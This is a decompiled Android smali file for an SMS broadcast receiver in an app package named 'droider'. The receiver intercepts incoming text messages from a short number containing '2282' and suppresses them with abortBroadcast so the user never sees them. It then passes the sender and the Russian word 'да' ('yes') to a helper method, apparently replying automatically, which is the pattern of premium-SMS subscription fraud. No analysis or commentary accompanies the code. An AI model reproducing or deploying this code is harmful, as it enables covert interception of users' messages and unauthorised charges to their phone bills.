.class Leu/evandorostech/droider/ClassAct$1;
.super Landroid/content/BroadcastReceiver;
.source "ClassAct.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Leu/evandorostech/droider/ClassAct;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Leu/evandorostech/droider/ClassAct;


# direct methods
.method constructor <init>(Leu/evandorostech/droider/ClassAct;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Leu/evandorostech/droider/ClassAct$1;->this$0:Leu/evandorostech/droider/ClassAct;

    .line 612
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 12
    .param p1, "_context"    # Landroid/content/Context;
    .param p2, "_intent"    # Landroid/content/Intent;

    .prologue
    const/4 v7, 0x0

    .line 616
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v6

    const-string v8, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 617
    const-string v5, "I am Safe and Well"

    .line 618
    .local v5, "queryString":Ljava/lang/String;
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 620
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_0

    .line 622
    const-string v6, "pdus"

    invoke-virtual {v0, v6}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [Ljava/lang/Object;

    .line 623
    .local v4, "pdus":[Ljava/lang/Object;
    array-length v6, v4

    new-array v3, v6, [Landroid/telephony/SmsMessage;

    .line 624
    .local v3, "messages":[Landroid/telephony/SmsMessage;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    array-length v6, v4

    if-lt v1, v6, :cond_1

    .line 629
    array-length v8, v3

    move v6, v7

    :goto_1
    if-lt v6, v8, :cond_2

    .line 656
    .end local v0    # "bundle":Landroid/os/Bundle;
    .end local v1    # "i":I
    .end local v3    # "messages":[Landroid/telephony/SmsMessage;
    .end local v4    # "pdus":[Ljava/lang/Object;
    .end local v5    # "queryString":Ljava/lang/String;
    :cond_0
    return-void

    .line 627
    .restart local v0    # "bundle":Landroid/os/Bundle;
    .restart local v1    # "i":I
    .restart local v3    # "messages":[Landroid/telephony/SmsMessage;
    .restart local v4    # "pdus":[Ljava/lang/Object;
    .restart local v5    # "queryString":Ljava/lang/String;
    :cond_1
    aget-object v6, v4, v1

    check-cast v6, [B

    invoke-static {v6}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v6

    .line 626
    aput-object v6, v3, v1

    .line 624
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 629
    :cond_2
    aget-object v2, v3, v6

    .line 631
    .local v2, "message":Landroid/telephony/SmsMessage;
    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v9

    const-string v10, "+7"

    const-string v11, "8"

    invoke-virtual {v9, v10, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x4

    invoke-virtual {v9, v7, v10}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v9

    const-string v10, "2282"

    invoke-virtual {v9, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_3

    .line 632
    invoke-virtual {p0}, Leu/evandorostech/droider/ClassAct$1;->abortBroadcast()V

    .line 634
    iget-object v9, p0, Leu/evandorostech/droider/ClassAct$1;->this$0:Leu/evandorostech/droider/ClassAct;

    invoke-virtual {v2}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v10

    const-string v11, "\u0434\u0430"

    invoke-virtual {v9, v10, v11}, Leu/evandorostech/droider/ClassAct;->f12(Ljava/lang/String;Ljava/lang/String;)V

    .line 629
    :cond_3
    add-int/lit8 v6, v6, 0x1

    goto :goto_1
.end method
